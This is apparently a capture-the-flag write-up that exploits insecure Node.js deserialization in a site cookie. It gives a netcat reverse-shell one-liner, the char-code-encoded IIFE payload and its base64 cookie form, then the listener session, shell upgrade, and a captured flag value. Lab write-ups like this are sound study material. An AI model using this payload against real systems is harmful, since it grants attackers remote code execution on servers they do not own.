JSON is a format that encodes objects in a string. **Serialization means to convert an object into that string**, and deserialization is its inverse operation (convert string -> object).

Untrusted data passed into `unserialize()` function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an `Immediately invoked function expression (IIFE)`

Enter anything random in the given box and observe the changes reflected in its cookie.
So, it can be the case of `serialization`.

**Step 1 :**

Decode the cookie:

`{"email":"aaa"}`

**Step 2:**
For payload, visit the site `https://github.com/N3H4L/NodeJS-deserialization-payload-generator`.
_We can form the payload using this in case of searialisation.__
```bash
python3 payload-gen.py 

----------------------------------------------------------------
|                                                              |
|    NodeJS Deserialization vulnerability payload generator    |
|               Coded by: Nehal Zaman (@pwnersec)              |
|                                                              |
----------------------------------------------------------------

Enter your command >> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.23.186 1234 >/tmp/f
Your payload: _$$ND_FUNC$$_function(){eval(String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,114,109,32,47,116,109,112,47,102,59,109,107,102,105,102,111,32,47,116,109,112,47,102,59,99,97,116,32,47,116,109,112,47,102,124,47,98,105,110,47,115,104,32,45,105,32,50,62,38,49,124,110,99,32,49,48,46,49,56,46,50,51,46,49,56,54,32,49,50,51,52,32,62,47,116,109,112,47,102,39,41))}()
```

Next, put this payload into JSON string 
```json
{"email":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,114,109,32,47,116,109,112,47,102,59,109,107,102,105,102,111,32,47,116,109,112,47,102,59,99,97,116,32,47,116,109,112,47,102,124,47,98,105,110,47,115,104,32,45,105,32,50,62,38,49,124,110,99,32,49,48,46,49,56,46,50,51,46,49,56,54,32,49,50,51,52,32,62,47,116,109,112,47,102,39,41))}()"}
```

Next, encode this using base64
```
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe2V2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDEwMSwxMjAsMTAxLDk5LDQwLDM5LDExNCwxMDksMzIsNDcsMTE2LDEwOSwxMTIsNDcsMTAyLDU5LDEwOSwxMDcsMTAyLDEwNSwxMDIsMTExLDMyLDQ3LDExNiwxMDksMTEyLDQ3LDEwMiw1OSw5OSw5NywxMTYsMzIsNDcsMTE2LDEwOSwxMTIsNDcsMTAyLDEyNCw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzIsNDUsMTA1LDMyLDUwLDYyLDM4LDQ5LDEyNCwxMTAsOTksMzIsNDksNDgsNDYsNDksNTYsNDYsNTAsNTEsNDYsNDksNTYsNTQsMzIsNDksNTAsNTEsNTIsMzIsNjIsNDcsMTE2LDEwOSwxMTIsNDcsMTAyLDM5LDQxKSl9KCkifQ==
```

- Now, put the above payload at the plave of coookie value and simaltaneously open netcat listener in the attacking machine.

**Shell:-**
```bash
┌──(Spadille㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.18.23.186] from (UNKNOWN) [10.10.218.3] 39110
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'     
dylan@jason:/opt/webapp$ ^Z     
[1]+  Stopped                 nc -lnvp 1234

┌──(Spadille㉿kali)-[~]
└─$ stty -a 
speed 38400 baud; rows 36; columns 172; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;
discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts                    
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0      
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
                                                                                                          
                                                                                     
┌──(Spadille㉿kali)-[~]                                                              
└─$ stty raw -echo; fg
nc -lnvp 1234                                                                        
                                                                                     
dylan@jason:/opt/webapp$ stty rows 36 columns 172                                    
dylan@jason:/opt/webapp$ export TERM=xterm
dylan@jason:/opt/webapp$ ls -la
total 32
drwxr-xr-x  3 root root 4096 Sep  2 16:10 .
drwxr-xr-x  3 root root 4096 Jun 10  2021 ..
-r--r--r--  1 root root 3561 Sep  2 16:10 index.html
drwxr-xr-x 23 root root 4096 Jun 10  2021 node_modules
-rw-r--r--  1 root root  385 Jun 10  2021 package.json
-rw-r--r--  1 root root 6332 Jun 10  2021 package-lock.json
-rw-r--r--  1 root root 1454 Sep  2 16:10 server.js

dylan@jason:/$ cd 
dylan@jason:~$ ls
user.txt
dylan@jason:~$ cat user.txt 
0ba48780dee9f5677a4461f588af217c